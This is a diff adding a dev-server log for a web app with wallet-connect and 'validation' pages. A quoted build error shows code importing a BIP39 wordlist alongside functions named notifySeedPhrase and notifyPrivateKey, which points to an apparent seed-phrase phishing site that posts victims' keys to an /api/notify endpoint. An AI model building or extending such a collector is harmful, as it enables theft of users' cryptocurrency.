@@ -1,0 +1,498 @@
+
+> rest-express@1.0.0 dev
+> NODE_ENV=development tsx server/index.ts
+
+[1G[0K7:06:14 AM [express] serving on port 5000
+
+A PostCSS plugin did not pass the `from` option to `postcss.parse`. This may cause imported assets to be incorrectly transformed. If you've recently added a PostCSS plugin that raised this warning, please contact the package author to fix the issue.
+
+
+
+
+
+
+
+
+
+
+[1;1H[0J[2m7:12:28 AM[22m [36m[1m[vite][22m[39m [90m[2m(client)[22m[39m [32mhmr update [39m[2m/src/index.css, /src/pages/connect-wallet.tsx, /src/pages/dashboard.tsx, /src/components/wallet-connect-modal.tsx[22m
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+[1;1H[0J[2m7:12:36 AM[22m [36m[1m[vite][22m[39m [90m[2m(client)[22m[39m [32mhmr update [39m[2m/src/index.css, /src/components/wallet-connect-modal.tsx[22m
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+[1;1H[0J[2m7:12:42 AM[22m [36m[1m[vite][22m[39m [90m[2m(client)[22m[39m [32mhmr update [39m[2m/src/index.css, /src/components/wallet-connect-modal.tsx[22m [33m(x2)[39m
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+[1;1H[0J[2m7:13:02 AM[22m [36m[1m[vite][22m[39m [90m[2m(client)[22m[39m [32mhmr update [39m[2m/src/index.css, /src/components/wallet-connect-modal.tsx[22m [33m(x3)[39m
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+[1;1H[0J[2m7:13:09 AM[22m [36m[1m[vite][22m[39m [90m[2m(client)[22m[39m [32mhmr update [39m[2m/src/pages/connect-wallet.tsx, /src/index.css[22m
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+[1;1H[0J[2m7:13:21 AM[22m [36m[1m[vite][22m[39m [90m[2m(client)[22m[39m [32mhmr update [39m[2m/src/pages/dashboard.tsx, /src/index.css[22m
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+[1;1H[0J[2m7:13:31 AM[22m [36m[1m[vite][22m[39m [90m[2m(client)[22m[39m [32mhmr update [39m[2m/src/pages/dashboard.tsx, /src/index.css[22m [33m(x2)[39m
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+[1;1H[0J[2m7:13:52 AM[22m [36m[1m[vite][22m[39m [90m[2m(client)[22m[39m [32mhmr update [39m[2m/src/pages/dashboard.tsx, /src/index.css[22m [33m(x3)[39m
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+[1;1H[0J[2m7:14:04 AM[22m [36m[1m[vite][22m[39m [90m[2m(client)[22m[39m [32mhmr update [39m[2m/src/pages/connect-wallet.tsx, /src/index.css[22m
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+[1;1H[0J[2m7:14:09 AM[22m [36m[1m[vite][22m[39m [90m[2m(client)[22m[39m [32mhmr update [39m[2m/src/pages/connect-wallet.tsx, /src/index.css[22m [33m(x2)[39m
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+[1;1H[0J[2m7:14:14 AM[22m [36m[1m[vite][22m[39m [90m[2m(client)[22m[39m [32mhmr update [39m[2m/src/pages/connect-wallet.tsx, /src/index.css[22m [33m(x3)[39m
+7:15:42 AM [express] POST /api/notify 200 in 766ms :: {"ok":true}
+7:18:36 AM [express] POST /api/notify 200 in 715ms :: {"ok":true}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+[1;1H[0J[2m7:28:47 AM[22m [36m[1m[vite][22m[39m [90m[2m(client)[22m[39m [32mhmr update [39m[2m/src/index.css, /src/pages/dashboard.tsx, /src/components/wallet-connect-modal.tsx[22m
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+[1;1H[0J[2m7:30:15 AM[22m [36m[1m[vite][22m[39m [90m[2m(client)[22m[39m [32mpage reload [39m[2mindex.html[22m
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+[1;1H[0J[2m7:30:26 AM[22m [36m[1m[vite][22m[39m [90m[2m(client)[22m[39m [32mhmr update [39m[2m/src/index.css, /src/pages/dashboard.tsx, /src/components/wallet-connect-modal.tsx[22m
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+[1;1H[0J[2m7:49:46 AM[22m [36m[1m[vite][22m[39m [90m[2m(client)[22m[39m [32mhmr update [39m[2m/src/index.css, /src/components/validation-modal.tsx[22m
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+[1;1H[0J[2m7:49:48 AM[22m [31m[1m[vite][22m[39m [31mInternal server error: Missing "./wordlists/english" specifier in "@scure/bip39" package[39m
+  Plugin: [35mvite:import-analysis[39m
+  File: [36m/home/runner/workspace/client/src/components/validation-modal.tsx[39m:2:39
+[33m  17 |  var _s = $RefreshSig$();
+  18 |  import { useState, useRef, useEffect } from "react";
+  19 |  import { wordlist as BIP39_LIST } from "@scure/bip39/wordlists/english";
+     |                                          ^
+  20 |  import { notifySeedPhrase, notifyPrivateKey } from "@/lib/notify";
+  21 |  const BIP39_WORDS = new Set(BIP39_LIST);[39m
+      at e (/home/runner/workspace/node_modules/vite/dist/node/chunks/config.js:6651:8)
+      at n (/home/runner/workspace/node_modules/vite/dist/node/chunks/config.js:6663:14)
+      at o (/home/runner/workspace/node_modules/vite/dist/node/chunks/config.js:6691:10)
+      at resolveExportsOrImports (/home/runner/workspace/node_modules/vite/dist/node/chunks/config.js:32826:45)
+      at resolveDeepImport (/home/runner/workspace/node_modules/vite/dist/node/chunks/config.js:32840:22)
+      at tryNodeResolve (/home/runner/workspace/node_modules/vite/dist/node/chunks/config.js:32715:70)
+      at ResolveIdContext.handler (/home/runner/workspace/node_modules/vite/dist/node/chunks/config.js:32554:16)
+      at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
+      at async EnvironmentPluginContainer.resolveId (/home/runner/workspace/node_modules/vite/dist/node/chunks/config.js:28716:19)
+      at async TransformPluginContext.resolve (/home/runner/workspace/node_modules/vite/dist/node/chunks/config.js:28928:13)
+      at async normalizeUrl (/home/runner/workspace/node_modules/vite/dist/node/chunks/config.js:27110:22)
+      at async <anonymous> (/home/runner/workspace/node_modules/vite/dist/node/chunks/config.js:27176:32)
+      at async Promise.all (index 4)
+      at async TransformPluginContext.transform (/home/runner/workspace/node_modules/vite/dist/node/chunks/config.js:27144:4)
+      at async EnvironmentPluginContainer.transform (/home/runner/workspace/node_modules/vite/dist/node/chunks/config.js:28796:14)
+      at async loadAndTransform (/home/runner/workspace/node_modules/vite/dist/node/chunks/config.js:22669:26)
+      at async viteTransformMiddleware (/home/runner/workspace/node_modules/vite/dist/node/chunks/config.js:24541:20)
+[1G[0K⠙[1G[0K[1mnpm[22m [96mnotice[39m
+[1mnpm[22m [96mnotice[39m New [31mmajor[39m version of npm available! [31m10.8.2[39m -> [34m11.11.1[39m
+[1mnpm[22m [96mnotice[39m Changelog: [34mhttps://github.com/npm/cli/releases/tag/v11.11.1[39m
+[1mnpm[22m [96mnotice[39m To update run: [4mnpm install -g npm@11.11.1[24m
+[1mnpm[22m [96mnotice[39m
+[1G[0K⠙[1G[0K
